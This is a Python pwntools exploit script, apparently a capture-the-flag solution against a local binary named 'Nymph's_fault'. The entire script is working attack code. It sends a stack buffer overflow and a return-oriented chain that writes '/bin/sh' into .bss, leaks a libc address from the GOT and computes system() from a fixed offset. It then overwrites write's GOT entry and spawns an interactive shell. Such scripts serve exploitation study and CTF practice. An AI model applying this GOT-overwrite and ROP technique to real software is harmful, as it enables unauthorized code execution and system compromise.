from pwn import *
import time
print("-------------------")
print("---Nymph's Fault---")
print("--pwned by pwnWiz--")
print("-------------------")
print("\n")

context.log_level="debug"

#plt_read = 0x400630
#plt_write = 0x400600

r = process("./Nymph\'s_fault")
e = ELF("./Nymph\'s_fault")

plt_read = e.plt['read']
plt_write = e.plt['write']
got_read = e.got['read']
got_write = e.got['write']
bss_addr = 0x602070
pppr = 0x40076a

r.recv(1024)
r.sendline("3")
r.recv(1024)

#stack size+sfp
payload="A"*256
payload+="B"*8

#write /bin/sh\00 to bss_addr(0x602070)
payload+=p64(pppr)
payload+=p64(0)
payload+=p64(bss_addr)
payload+=p64(len("/bin/sh\00"))
payload+=p64(plt_read)

#read plt_write
payload+=p64(pppr)
payload+=p64(1)
payload+=p64(got_read)
payload+=p64(0x8)
payload+=p64(plt_write)

#got overwrite got_write
payload+=p64(pppr)
payload+=p64(0)
payload+=p64(got_write)
payload+=p64(0x8)
payload+=p64(plt_read)

#use plt_write as system()
payload+=p64(plt_write)
payload+=p64(0x8)
payload+=p64(bss_addr)

#send payload
r.send(payload)

#insert /bin/sh\00 to bss_addr
r.sendline("/bin/sh\00")

#read got_write 
r.recv(0x183)
leak_libc=u64(r.recv(8))
print "leak_libc : " + str(hex(leak_libc))

#offset to system
offset=0x9ad50
system_addr = leak_libc-offset
print "system_addr : " + str(hex(system_addr))

#send system_addr
r.sendline(p64(system_addr))

#get shell
r.interactive()
